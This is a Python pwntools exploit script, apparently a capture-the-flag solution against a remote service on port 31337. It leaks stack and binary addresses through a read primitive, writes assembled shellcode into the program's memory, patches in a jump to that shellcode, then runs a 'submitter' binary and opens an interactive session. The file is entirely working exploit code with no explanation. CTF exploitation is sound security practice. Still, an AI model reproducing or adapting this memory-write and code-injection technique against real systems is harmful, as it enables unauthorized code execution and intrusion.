#!/usr/bin/env python3

from pwn import *
context.arch="amd64"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
p.sendlineafter("Choice:","1")
p.sendlineafter("Address:","0")
p.recvuntil("Value:")
stack=int(p.recvline(),16)
print(f"stack:{stack}")
p.sendlineafter("Choice:","1")
p.sendlineafter("Address:",hex(stack-0x20))
p.recvuntil("Value:")
elf=int(p.recvline(),16)-0x1285
print(f"elf:{hex(elf)}")
start=0x2800
s=f"""
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rax,0x6e
syscall
mov rdi,rax
mov r13,{elf+0x148C}
mov r14,{elf+0x14FC}
mov rsi,{elf+0x34D8}
call r13
sub rax,0x300e0
mov r12,rax
mov rsi,{stack-0x20-0xf0}
mov rdx,r12
sub rdx,0x2698b
call r14


mov r9,r12
add r9,0x187908
mov rsi,{stack-0x20-0xf0+8}
mov rdx,r9
call r14
mov rsi,{stack-0x20-0xf0+16}
mov rdx,{elf+0x13C5}
call r14
mov rsi,{stack-0x20-0xf0+24}
mov rdx,r12
call r14


mov r15,0x414141414141
mov [r15],r15
"""
s=asm(s)
t=len(s)//8+1
s=s.ljust(t*8,b'\x90')
for i in range(t):
    p.sendlineafter("Choice:","2")
    p.sendlineafter("Value:",hex(u64(s[i*8:i*8+8])))
    p.sendlineafter("Address:",hex(elf+start+i*8))
p.sendlineafter("Choice:","2")
p.sendlineafter("Value:",hex(u64(asm("jmp $+0x1380")+b'\x90\x90\x90')))
p.sendlineafter("Address:",hex(elf+0x1484))
sleep(1)
p.sendline("3")
sleep(1)
p.sendline("./submitter")

p.interactive()
